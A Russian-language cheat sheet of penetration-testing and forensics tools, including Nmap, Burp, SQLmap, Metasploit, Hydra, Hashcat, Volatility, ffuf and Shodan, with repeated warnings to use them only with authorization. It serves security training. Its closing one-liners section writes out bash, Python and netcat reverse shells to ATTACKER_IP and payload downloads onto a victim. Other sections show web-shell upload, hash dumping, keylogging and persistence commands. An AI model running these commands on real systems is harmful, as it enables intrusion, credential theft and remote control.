# Шпаргалка: инструменты ИБ

> Быстрый справочник по ключевым инструментам кибербезопасности

---

## Nmap — сканирование портов

```bash
# Базовое сканирование
nmap target                           # Базовый скан (1000 портов)
nmap -p- target                       # Все 65535 портов
nmap -p 22,80,443 target              # Конкретные порты
nmap -p 80-8080 target                # Диапазон

# Версии и скрипты
nmap -sV target                       # Определение версий сервисов
nmap -sC target                       # Стандартные скрипты NSE
nmap -A target                        # Агрессивный (OS, versions, scripts, traceroute)
nmap -O target                        # Только определение ОС

# Типы сканирования
nmap -sS target                       # SYN (стелс, по умолчанию с root)
nmap -sT target                       # TCP Connect (без root)
nmap -sU target                       # UDP сканирование
nmap -sN target                       # NULL scan (обход firewall)
nmap -sF target                       # FIN scan
nmap -sX target                       # Xmas scan

# Скорость
nmap -T0 target                       # Paranoid (медленно)
nmap -T3 target                       # Normal (по умолчанию)
nmap -T4 target                       # Aggressive (быстро)
nmap -T5 target                       # Insane (очень быстро, шумно)

# Подсети
nmap 192.168.1.0/24                   # Вся подсеть
nmap -iL hosts.txt                    # Из файла
nmap --exclude 192.168.1.1            # Исключить хост

# NSE скрипты
nmap --script vuln target             # Уязвимости
nmap --script=smb-vuln* target        # SMB уязвимости
nmap --script=http-title target       # HTTP заголовки
nmap --script=ssh-brute target        # Брутфорс SSH (осторожно!)

# Вывод
nmap -oN output.txt target            # Normal output
nmap -oX output.xml target            # XML output
nmap -oG output.gnmap target          # Grepable output
nmap -oA output target                # Все форматы сразу

# Практические примеры
nmap -sV -sC -p- -T4 -oA full_scan 192.168.1.1    # Полный скан
nmap -sU -p 161,162 --script snmp-info target       # SNMP
nmap -p 445 --script=smb-vuln-ms17-010 target       # EternalBlue
```

---

## Wireshark / tcpdump — анализ трафика

```bash
# tcpdump
tcpdump -i eth0                       # Захват на интерфейсе
tcpdump -i any                        # Все интерфейсы
tcpdump -i eth0 -w capture.pcap       # Записать в файл
tcpdump -r capture.pcap               # Читать из файла
tcpdump -n                            # Не резолвить имена
tcpdump -v / -vv / -vvv               # Детальность

# Фильтры tcpdump
tcpdump host 192.168.1.1              # Конкретный хост
tcpdump net 192.168.1.0/24            # Подсеть
tcpdump port 80                       # Порт
tcpdump tcp                           # Только TCP
tcpdump udp                           # Только UDP
tcpdump src 1.2.3.4                   # Источник
tcpdump dst 1.2.3.4                   # Назначение

# BPF (Berkeley Packet Filter) примеры
tcpdump -i eth0 'tcp port 80 or tcp port 443'
tcpdump -i eth0 'host 192.168.1.1 and port 22'
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'   # SYN пакеты
tcpdump -i eth0 'icmp'                             # ICMP (ping)
tcpdump -i eth0 'not port 22'                      # Всё кроме SSH
tcpdump -i eth0 'greater 1000'                     # Пакеты > 1000 байт

# Полезные комбинации
# Захват DNS
tcpdump -i any -n port 53 -w dns.pcap

# Захват HTTP
tcpdump -i eth0 -A -s0 port 80

# Suspicious outbound (не стандартные порты)
tcpdump -i eth0 'not port 80 and not port 443 and not port 22 and tcp'

# Wireshark фильтры (Display filters)
ip.addr == 192.168.1.1                # IP фильтр
tcp.port == 80                        # TCP порт
http                                  # HTTP трафик
http.request.method == "POST"         # HTTP POST
dns                                   # DNS трафик
tcp.flags.syn == 1                    # SYN пакеты
frame contains "password"             # Поиск строки
ssl.handshake.type == 1               # TLS Client Hello
http.response.code == 200             # HTTP 200
!(arp or icmp or dns)                 # Исключить шумный трафик

# Экстракция файлов из PCAP
# File → Export Objects → HTTP
# NetworkMiner (автоматически)
networkMiner -r capture.pcap
```

---

## Burp Suite — веб-тестирование

```
КЛЮЧЕВЫЕ ФУНКЦИИ:

Proxy → Intercept
  └── Перехват и изменение запросов в реальном времени

Proxy → HTTP History
  └── История всех запросов через прокси (обязательно смотреть!)

Target → Site Map
  └── Карта сайта, все обнаруженные URL

Repeater (Ctrl+R)
  └── Ручное переотправление и модификация запросов
  └── Основной инструмент тестирования

Intruder (Ctrl+I)
  └── Автоматизированный fuzzing (медленно в Community)

Decoder
  └── base64, URL encoding, hex, HTML entities

Comparer
  └── Сравнение двух ответов

Scanner (только Pro)
  └── Автоматический поиск уязвимостей

Collaborator (только Pro)
  └── Out-of-Band тестирование (SSRF, XXE, blind injection)
```

```
WORKFLOW В BURP:

1. Настроить браузер: Proxy → 127.0.0.1:8080
2. Установить CA сертификат:
   http://burp → CA Certificate → Trust в браузере

3. Proxy → Intercept ON
4. Выполнить действие в браузере
5. Перехваченный запрос → Forward / Drop / Edit

6. Интересный запрос → Send to Repeater
7. В Repeater: изменяем параметры → Send → смотрим Response

8. Нашли уязвимость → Send to Intruder для автоматизации
```

```
HOTKEYS BURP SUITE:
Ctrl+R     → Send to Repeater
Ctrl+I     → Send to Intruder
Ctrl+U     → URL encode selection
Ctrl+Shift+U → URL decode
Ctrl+B     → Base64 encode
Ctrl+Shift+B → Base64 decode
Ctrl+F     → Search
```

---

## SQLmap — автоматический SQLi

```bash
# ВНИМАНИЕ: Использовать только с разрешения!

# Базовое использование
sqlmap -u "http://target.com/page?id=1"          # GET параметр
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"  # POST
sqlmap -u "URL" --cookie="session=abc123"         # С cookie
sqlmap -u "URL" -H "X-Custom: value"             # Заголовок

# Уровни
sqlmap -u "URL" --level=5                         # 1-5, выше = больше тестов
sqlmap -u "URL" --risk=3                          # 1-3, выше = опаснее

# Действия после обнаружения SQLi
sqlmap -u "URL" --dbs                             # Список баз данных
sqlmap -u "URL" -D database --tables              # Таблицы
sqlmap -u "URL" -D database -T users --columns    # Колонки
sqlmap -u "URL" -D database -T users -C "user,pass" --dump  # Дамп данных

# Обход WAF
sqlmap -u "URL" --tamper=space2comment            # Пробел → /**/
sqlmap -u "URL" --tamper=between                  # Использовать BETWEEN
sqlmap -u "URL" --tamper=randomcase               # RaNdOmCaSe
sqlmap -u "URL" --random-agent                    # Random User-Agent
sqlmap -u "URL" --delay=2                         # Задержка между запросами

# Специфические техники
sqlmap -u "URL" --technique=BEUSTQ               # Все техники (Default)
sqlmap -u "URL" --technique=T                     # Только time-based
sqlmap -u "URL" --technique=U                     # Только union-based

# Из файла (сохранённый Burp запрос)
sqlmap -r request.txt                             # Из файла запроса
sqlmap -r request.txt -p "id"                    # Конкретный параметр

# Batch (без интерактивности)
sqlmap -u "URL" --batch --dbs                     # Авто-ответы

# OS интеграция (если есть права)
sqlmap -u "URL" --os-shell                        # Интерактивный shell
sqlmap -u "URL" --file-read "/etc/passwd"         # Чтение файла
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/shell.php"
```

---

## Metasploit — фреймворк эксплуатации

```bash
# ТОЛЬКО ДЛЯ АВТОРИЗОВАННОГО ТЕСТИРОВАНИЯ!

# Запуск
msfconsole                            # Интерактивный режим
msfconsole -q                         # Без баннера

# Основные команды
help                                  # Помощь
search smb                            # Поиск модулей
use exploit/windows/smb/ms17_010_eternalblue  # Выбрать модуль
info                                  # Информация о модуле
show options                          # Опции модуля
show payloads                         # Доступные payload

# Настройка и запуск
set RHOSTS 192.168.1.100             # Цель
set LHOST 192.168.1.50               # Наш IP
set LPORT 4444                        # Наш порт
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run / exploit                         # Запустить

# Meterpreter команды (после получения сессии)
sysinfo                               # Информация о системе
getuid                                # Текущий пользователь
getpid                                # PID процесса
ps                                    # Список процессов
migrate 1234                          # Мигрировать в процесс
shell                                 # Системный shell
upload /local/file /remote/path       # Загрузить файл
download /remote/file /local/path     # Скачать файл
hashdump                              # Дамп хэшей (Admin)
getsystem                             # Попытка привилегий
run post/multi/recon/local_exploit_suggester  # Вектора privesc
keyscan_start / keyscan_dump          # Кейлоггер
screenshot                            # Скриншот

# Persistence
run post/windows/manage/persistence   # Persistence через автозапуск
run post/windows/manage/enable_rdp    # Включить RDP

# Управление сессиями
sessions                              # Список сессий
sessions -i 1                         # Вернуться к сессии
background                            # Фонновать сессию
```

---

## Hydra / Medusa / Ncrack — брутфорс

```bash
# ТОЛЬКО С ЯВНОГО РАЗРЕШЕНИЯ!

# Hydra
hydra -l admin -p password ssh://192.168.1.1     # Один логин/пароль
hydra -l admin -P /wordlists/rockyou.txt ssh://target  # Wordlist паролей
hydra -L users.txt -P passwords.txt ssh://target  # Оба wordlist
hydra -t 4 -l user -P pass.txt ftp://target       # 4 потока
hydra -I -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Протоколы
hydra target ssh                      # SSH
hydra target ftp                      # FTP
hydra target smtp                     # SMTP
hydra target mysql                    # MySQL
hydra target rdp                      # RDP
hydra target smb                      # SMB
hydra -l admin -P pass.txt target http-get /admin/  # HTTP Basic Auth

# HTTP форма (веб-приложение)
hydra -l admin -P rockyou.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# Medusa (альтернатива)
medusa -h target -u admin -P passwords.txt -M ssh

# Ncrack (ещё альтернатива)
ncrack -p 22 --user admin -P passwords.txt target
```

---

## John the Ripper / Hashcat — взлом хэшей

```bash
# John the Ripper
john hashes.txt                       # Автоопределение формата
john --format=raw-md5 hashes.txt      # Указать формат
john --wordlist=/wordlists/rockyou.txt hashes.txt
john --rules hashes.txt               # С манглинг правилами
john --show hashes.txt                # Показать взломанные
john --list=formats                   # Список форматов

# Специфические форматы
john --format=sha512crypt shadow.txt  # /etc/shadow Linux
john --format=nt ntlm_hashes.txt      # Windows NT hash
john --format=md5crypt hashes.txt     # MD5crypt ($1$)

# Hashcat (быстрее на GPU)
hashcat -m 0 hashes.txt rockyou.txt   # MD5
hashcat -m 100 hashes.txt rockyou.txt # SHA1
hashcat -m 1000 hashes.txt rockyou.txt # NTLM
hashcat -m 1800 hashes.txt rockyou.txt # SHA-512unix
hashcat -m 13100 hashes.txt rockyou.txt # Kerberoast (TGS)
hashcat -m 22000 hashes.txt rockyou.txt # WPA2

# Режимы атаки Hashcat
hashcat -a 0 -m 0 hashes.txt wordlist.txt         # Dictionary
hashcat -a 1 -m 0 hashes.txt word1.txt word2.txt  # Combinator
hashcat -a 3 -m 0 hashes.txt ?d?d?d?d             # Brute-force (4 digits)
hashcat -a 6 -m 0 hashes.txt wordlist.txt ?d?d?d  # Hybrid (word+mask)

# Маски hashcat:
# ?l = lowercase a-z
# ?u = uppercase A-Z
# ?d = digits 0-9
# ?s = special chars
# ?a = all (l+u+d+s)

hashcat -a 3 -m 0 hashes.txt ?l?l?l?l?d?d?d?s    # Пример маски
```

---

## Volatility — анализ дампов памяти

```bash
# Volatility 3 (современная версия)
vol -f memory.raw windows.info        # Информация об образе
vol -f memory.raw windows.pslist      # Список процессов
vol -f memory.raw windows.pstree      # Дерево процессов
vol -f memory.raw windows.cmdline     # Аргументы командной строки
vol -f memory.raw windows.dlllist     # Загруженные DLL
vol -f memory.raw windows.netscan     # Сетевые соединения
vol -f memory.raw windows.netstat     # Статус соединений
vol -f memory.raw windows.handles     # Открытые дескрипторы
vol -f memory.raw windows.filescan    # Сканирование файлов
vol -f memory.raw windows.malfind     # Поиск injected кода
vol -f memory.raw windows.hashdump    # Дамп хэшей паролей
vol -f memory.raw windows.registry.hivescan  # Реестр
vol -f memory.raw windows.vadinfo     # Virtual Address Descriptors

# Практические команды форензики
# Найти подозрительные процессы
vol -f memory.raw windows.pslist | grep -i "cmd\|powershell\|wscript"

# Извлечь исполняемый файл процесса
vol -f memory.raw windows.dumpfiles --pid 1234 --output-dir ./dump/

# Поиск строк в памяти
vol -f memory.raw windows.strings --pid 1234 | grep -i "http\|password"

# Для Linux дампов
vol -f memory.raw linux.pslist
vol -f memory.raw linux.netstat
vol -f memory.raw linux.bash

# Volatility 2 (старый синтаксис, но иногда нужен)
volatility -f memory.raw --profile=Win10x64 imageinfo  # Определить профиль
volatility -f memory.raw --profile=Win10x64_17763 pslist
volatility -f memory.raw --profile=Win10x64_17763 netscan
```

---

## Nikto — веб-сканер

```bash
# Базовое использование
nikto -h http://target.com            # Сканирование
nikto -h target.com -p 443 -ssl       # HTTPS
nikto -h target.com -p 8080           # Другой порт

# Опции
nikto -h target.com -o results.html -Format html   # HTML отчёт
nikto -h target.com -Tuning 1         # Только файлы
nikto -h target.com -Tuning 4         # XSS
nikto -h target.com -Tuning 9         # SQL Injection
nikto -h target.com -Tuning x         # Reverse proxy
nikto -h target.com -evasion 1        # Уклонение от IDS
nikto -h target.com -timeout 10       # Таймаут

# С прокси (Burp)
nikto -h target.com -useproxy http://127.0.0.1:8080

# Авторизация
nikto -h target.com -id admin:password    # Basic auth
nikto -h target.com -C cookies.txt        # С cookie

# Из файла
nikto -h targets.txt                  # Несколько целей
```

---

## Nuclei — быстрый поиск уязвимостей

```bash
# Быстрый старт
nuclei -u https://target.com          # Базовый скан
nuclei -l targets.txt                 # Список целей

# Шаблоны
nuclei -u target.com -t cves/         # Только CVE
nuclei -u target.com -t exposures/    # Раскрытые файлы
nuclei -u target.com -t misconfiguration/  # Мисконфигурации
nuclei -u target.com -t takeovers/    # Subdomain takeover
nuclei -u target.com -t default-logins/  # Дефолтные пароли
nuclei -u target.com -t technologies/ # Определение технологий

# Фильтры
nuclei -u target.com -severity critical,high    # Только критические
nuclei -u target.com -tags wordpress,rce        # По тегам
nuclei -u target.com -author "projectdiscovery" # По автору

# Обновление шаблонов
nuclei -update-templates               # Обновить

# Вывод
nuclei -u target.com -o results.txt   # В файл
nuclei -u target.com -json            # JSON формат
nuclei -u target.com -silent          # Только находки

# Ограничения
nuclei -u target.com -rate-limit 10   # 10 запросов в секунду
nuclei -u target.com -timeout 10      # Таймаут запроса
```

---

## ffuf — веб-фаззер

```bash
# Базовый перебор директорий
ffuf -u https://target.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# С расширениями
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -e .php,.html,.txt,.bak,.zip,.tar.gz

# Перебор параметров
ffuf -u "https://target.com/page?FUZZ=value" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 200

# Fuzzing значений параметра
ffuf -u "https://target.com/user?id=FUZZ" \
     -w /usr/share/seclists/Fuzzing/Integers/Integer-000000-001000.txt \
     -mc 200 \
     -fs 1234   # Фильтр по размеру (убрать типичный ответ)

# Субдомены (vhost)
ffuf -u https://target.com/ \
     -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 1000   # Фильтровать стандартный ответ

# POST
ffuf -u https://target.com/login \
     -X POST \
     -d "user=FUZZ&pass=password" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w usernames.txt

# Два fuzzer (FUZZ и W2)
ffuf -u https://target.com/api/FUZZ/W2 \
     -w endpoints.txt:FUZZ \
     -w ids.txt:W2

# Фильтры
-mc 200,301,302    # Только эти коды
-fc 404,403        # Исключить коды
-ms 1000           # Только размер ~1000 байт
-fs 1234           # Исключить размер
-ml 10             # Только с 10 строками
-mr "admin panel"  # Regex match в ответе

# Скорость
-t 50              # 50 потоков
-rate 100          # 100 запросов в секунду
-timeout 5         # Таймаут запроса

# Вывод
-o results.json -of json   # JSON
-o results.csv -of csv     # CSV
-v                         # Verbose
```

---

## Gobuster — поиск директорий

```bash
# Directory/File
gobuster dir \
    -u https://target.com/ \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,bak \
    -t 50 \
    -o results.txt

# DNS subdomain
gobuster dns \
    -d target.com \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -t 50 \
    -o subdomains.txt

# Vhost
gobuster vhost \
    -u https://target.com/ \
    -w vhosts.txt \
    -t 50

# S3 buckets
gobuster s3 \
    -w bucket-names.txt

# Фильтры
-s 200,301         # Только эти статус коды
--exclude-length 0  # Исключить пустые ответы
```

---

## Shodan CLI

```bash
# Установка
pip install shodan
shodan init YOUR_API_KEY

# Поиск
shodan search "apache 2.4.49"         # Уязвимые Apache
shodan search "port:3389 country:RU"  # RDP в России
shodan search "product:nginx"         # Nginx серверы
shodan search "vuln:CVE-2021-44228"  # Log4Shell уязвимые

# Информация о хосте
shodan host 8.8.8.8                   # Google DNS
shodan host 185.220.101.47            # TOR exit node

# Мониторинг своей организации
shodan domain example.com             # Поиск по домену

# Загрузка данных
shodan download results.json.gz "apache 2.4.49"
shodan parse results.json.gz --fields ip_str,port,org

# Статистика
shodan count "port:22 country:RU"
shodan stats --facets country,org "apache"
```

---

## Git секреты и OSINT

```bash
# GitLeaks — поиск секретов в репозитории
gitleaks detect --source . --report-path report.json

# TruffleHog — глубокий поиск
trufflehog git file://. --only-verified

# GitDorker — GitHub поиск утечек
# github.com/obheda12/GitDorker
python3 GitDorker.py -t GITHUB_TOKEN -d target.com

# Основные GitHub дорки (в строке поиска GitHub)
"target.com" password
"target.com" api_key
"target.com" secret
"@target.com" db_password
filename:.env "target.com"
filename:config.json "target.com"

# Wayback Machine
curl "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey"

# Google дорки
site:target.com filetype:env
site:target.com filetype:sql
site:target.com inurl:config
site:target.com "DB_PASSWORD"
site:target.com intitle:"index of"
```

---

## Полезные однострочники

```bash
# Reverse Shell (для авторизованного тестирования)
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# Netcat
nc -e /bin/sh ATTACKER_IP 4444

# Listener (на атакующей машине)
nc -nlvp 4444
# С улучшенным shell:
rlwrap nc -nlvp 4444

# Стабилизация shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z → stty raw -echo; fg → enter → export TERM=xterm

# Port forwarding (chisel)
# Сервер (у атакующего): chisel server -p 8000 --reverse
# Клиент (на жертве):    chisel client ATTACKER:8000 R:3306:localhost:3306

# Передача файлов
# HTTP сервер
python3 -m http.server 8080
# Скачать с жертвы
wget http://ATTACKER:8080/file.sh -O /tmp/file.sh
curl http://ATTACKER:8080/file.sh > /tmp/file.sh

# SMB сервер (Impacket)
impacket-smbserver share /path/to/share -smb2support
# Подключиться с Windows
copy \\ATTACKER\share\file.exe .

# Base64 передача (когда нет curl/wget)
# На атакующем:
base64 file.sh
# На жертве:
echo "BASE64DATA" | base64 -d > file.sh
```
